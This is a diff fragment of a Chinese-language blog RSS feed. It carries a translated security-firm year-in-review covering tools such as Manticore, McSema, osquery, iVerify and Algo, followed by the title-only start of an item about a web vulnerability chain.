+&lt;/h3&gt;&lt;p&gt;我们开源了高度灵活的符号执行工具Manticore，它已成为DARPA LADS项目的重要组成部分。我们将其应用于以太坊虚拟机(EVM)字节码分析，可自动发现合约函数、生成触发合约状态的交易并检查失败状态。&lt;/p&gt;
+&lt;h3 id=&#34;mcsema-20实现二进制文件近似源代码处理&#34;&gt;McSema 2.0实现二进制文件近似源代码处理
+&lt;/h3&gt;&lt;p&gt;我们对二进制翻译工具McSema进行了重大升级：代码清理、性能提升，并分离指令语义与控制流恢复创建Remill库。演示用例包括二进制补丁修改、与KLEE的符号执行，以及重用基于LLVM的工具(如libFuzzer)。&lt;/p&gt;
+&lt;h2 id=&#34;基础工具&#34;&gt;基础工具
+&lt;/h2&gt;&lt;h3 id=&#34;巩固以太坊基础设施&#34;&gt;巩固以太坊基础设施
+&lt;/h3&gt;&lt;p&gt;我们开发了行业领先的智能合约安全工具套件，包括适配Manticore用于以太坊安全审计。我们加入了企业以太坊联盟(EEA)，并公开了RSK和DappHub Sai的安全审计报告。&lt;/p&gt;
+&lt;h3 id=&#34;osquery扩展功能边界&#34;&gt;osquery扩展功能边界
+&lt;/h3&gt;&lt;p&gt;我们在2016年将Facebook的开源终端监控代理移植到Windows后，继续增强osquery框架：重新设计基于auditd的文件完整性监控，添加CCleaner恶意软件检测功能，并创建扩展仓库。&lt;/p&gt;
+&lt;h3 id=&#34;iverify满足iphone用户基本需求&#34;&gt;iVerify满足iPhone用户基本需求
+&lt;/h3&gt;&lt;p&gt;我们发布了包含最全面iOS越狱检测的iVerify库，可检测iOS 10和11的越狱状态，并承诺随iOS更新持续维护。&lt;/p&gt;
+&lt;h3 id=&#34;algo普及自托管vpn服务&#34;&gt;Algo普及自托管VPN服务
+&lt;/h3&gt;&lt;p&gt;我们2016年发布的自托管个人VPN服务器Algo在2017年获得广泛关注。它采用现代协议和密码，包含最小化软件集，并得到70名Github贡献者的704次提交。&lt;/p&gt;
+&lt;h2 id=&#34;学习与分享&#34;&gt;学习与分享
+&lt;/h2&gt;&lt;h3 id=&#34;推动漏洞缓解措施部署&#34;&gt;推动漏洞缓解措施部署
+&lt;/h3&gt;&lt;p&gt;我们比较了clang的CFI与Visual Studio的CFG实现，创建了Windows Defender的&amp;quot;Flying Sandbox Monster&amp;quot;——首个Windows平台沙盒化反病毒扫描器，使用Rust框架在AppContainers中隔离不可信应用。&lt;/p&gt;
+&lt;h3 id=&#34;聚焦binary-ninja&#34;&gt;聚焦Binary Ninja
+&lt;/h3&gt;&lt;p&gt;我们通过多种方式展示Vector35逆向平台的能力：解释其低级中间语言(LLIL)基础、演示如何开发平台无关工具、分享DEF CON CTF挑战分析模块。&lt;/p&gt;
+&lt;h3 id=&#34;支持重要事业&#34;&gt;支持重要事业
+&lt;/h3&gt;&lt;p&gt;我们赞助UIUC CTF等竞赛，支持GreHack等会议，并赞助Risky Business播客分享安全洞见。&lt;/p&gt;
+&lt;h2 id=&#34;2018年展望&#34;&gt;2018年展望
+&lt;/h2&gt;&lt;p&gt;我们将继续推进国防部DIUx的Voltron项目、深化区块链安全研究、增强开源项目支持(osquery、Google Santa等)、发布iVerify独立版、优化Algo的易用性，并通过DeepState等工具使先进技术更易获取。&lt;/p&gt;
+&lt;hr&gt;
+</description>
+        </item>
+        <item>
         <title>漏洞链大杂烩：postMessage、JSONP、WAF绕过、DOM型XSS、CORS与CSRF的完美风暴</title>
         <link>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E9%93%BE%E5%A4%A7%E6%9D%82%E7%83%A9postmessagejsonpwaf%E7%BB%95%E8%BF%87dom%E5%9E%8Bxsscors%E4%B8%8Ecsrf%E7%9A%84%E5%AE%8C%E7%BE%8E%E9%A3%8E%E6%9A%B4/</link>
         <pubDate>Fri, 01 Aug 2025 20:51:05 +0800</pubDate>
